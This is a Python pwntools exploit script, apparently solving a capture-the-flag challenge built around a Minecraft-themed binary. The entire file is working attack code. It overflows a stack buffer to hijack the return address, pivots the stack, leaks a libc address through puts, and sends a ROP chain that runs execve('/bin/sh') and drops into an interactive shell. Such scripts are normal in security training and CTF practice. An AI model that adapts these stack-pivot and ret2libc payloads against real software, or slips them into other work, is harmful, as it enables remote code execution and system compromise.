#!/usr/bin/python3

from pwn import *


exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe



info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x0000000000401388
        c
        c
        c
        ''')
        sleep(1)

#b* main+163
if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
#GDB()

info(exe.got['puts'])

sla("M I N C E R A F T", b"1")
payload = b'a'*64
payload += p64(0x0000000000404c00)
payload += p64(0x00000000004011c0) #main

sla("Enter world name:", payload)
sla("game mode", b"1")
sla("2. Exit", b"2")

sla("M I N C E R A F T", b"1")
payload = b'a'*64
payload += p64(0x0000000000404c20) #new rbp
payload += p64(0x00000000004011b7) #mov    eax, DWORD PTR [rbp-0x4]
payload += p64(0)
payload += p64(0x0040400000404000)
payload += p64(0x0000000000404900) #newest rbp
payload += p64(0x0000000000401243) #puts 

sla("Enter world name:", payload)
sla("game mode", b"1")
sla("2. Exit", b"2")

p.recvuntil("\n")

leak_libc = u64(p.recv(6)+b'\0\0')
info("leak libc: " + hex(leak_libc))
libc.address = leak_libc - libc.sym['puts']
info("libc base: " + hex(libc.address))

pop_rax = libc.address + 0x000000000003f197
pop_rdi = libc.address + 0x00000000000277e5
pop_rsi = libc.address + 0x0000000000028f99
pop_rdx = libc.address + 0x00000000000fde7d
syscall = libc.address + 0x0000000000026428

info("one_gadget: "+ hex(libc.address + 0x4c140))

payload = b"/bin/sh\0"

payload += b'a'*56
payload += p64(0x0000000000404900) #newest rbp


payload += p64(pop_rax)

payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(0x4048c0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(syscall)



#sla("Enter world name:", payload)

sl( payload)

info("one_gadget: "+ hex(libc.address + 0x4c140))


# sl(b"hello")
# sla("game mode", b"1")
sla("game mode", b"1")
sla("2. Exit", b"2")
p.interactive()

